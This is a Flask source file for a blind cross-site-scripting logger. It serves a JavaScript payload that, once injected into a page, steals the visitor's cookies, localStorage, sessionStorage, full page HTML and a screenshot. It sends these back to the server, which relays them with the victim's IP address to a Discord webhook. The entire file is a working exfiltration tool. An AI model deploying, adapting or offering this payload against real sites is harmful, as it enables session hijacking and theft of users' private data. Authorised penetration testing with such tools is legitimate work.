from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from datetime import datetime
import os
import json
import requests
import base64
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")

@app.route('/', methods=['GET', 'POST'])
def bxss_logger():
    if request.method == 'GET':
        # JavaScript payload returned when / is accessed via <script src="...">
        js = f"""
(async () => {{
  try {{
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    const data = {{
      type: "json",
      url: location.href,
      origin: location.origin,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      html: document.documentElement.outerHTML,
      timestamp: new Date().toISOString()
    }};

    await fetch("{request.host_url}", {{
      method: "POST",
      headers: {{
        "Content-Type": "application/json"
      }},
      body: JSON.stringify(data)
    }});

    await delay(2000);

    const canvas = await html2canvas(document.body);
    const imgData = canvas.toDataURL("image/png");

    await fetch("{request.host_url}", {{
      method: "POST",
      headers: {{
        "Content-Type": "application/json"
      }},
      body: JSON.stringify({{
        type: "screenshot",
        screenshot: imgData
      }})
    }});
  }} catch (e) {{
    console.error("BXSS script error:", e);
  }}
}})();
// Required for html2canvas to work
let s = document.createElement("script");
s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
document.head.appendChild(s);
"""
        return Response(js, mimetype="application/javascript")

    # Handle POST: either metadata or screenshot
    try:
        payload = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "Invalid JSON"}), 400

    payload_type = payload.get("type", "json")

    if payload_type == "json":
        payload["ip"] = request.remote_addr
        payload["server_time"] = datetime.utcnow().isoformat()

        if DISCORD_WEBHOOK:
            try:
                requests.post(DISCORD_WEBHOOK, json={
                    "content": f"📦 **BXSS Log**\n```json\n{json.dumps(payload, indent=2)}```"
                })
            except Exception as e:
                pass  # Avoid printing errors
        return jsonify({"status": "json_received"})

    elif payload_type == "screenshot":
        image_data = payload.get("screenshot", "")
        if image_data.startswith("data:image/png;base64,"):
            image_data = image_data.replace("data:image/png;base64,", "")

        try:
            image_bytes = base64.b64decode(image_data)
            files = {
                'file': ('screenshot.png', image_bytes, 'image/png')
            }
            if DISCORD_WEBHOOK:
                requests.post(DISCORD_WEBHOOK, files=files)
        except Exception as e:
            pass  # Ignore errors

        return jsonify({"status": "screenshot_received"})

    return jsonify({"error": "Unknown type"}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
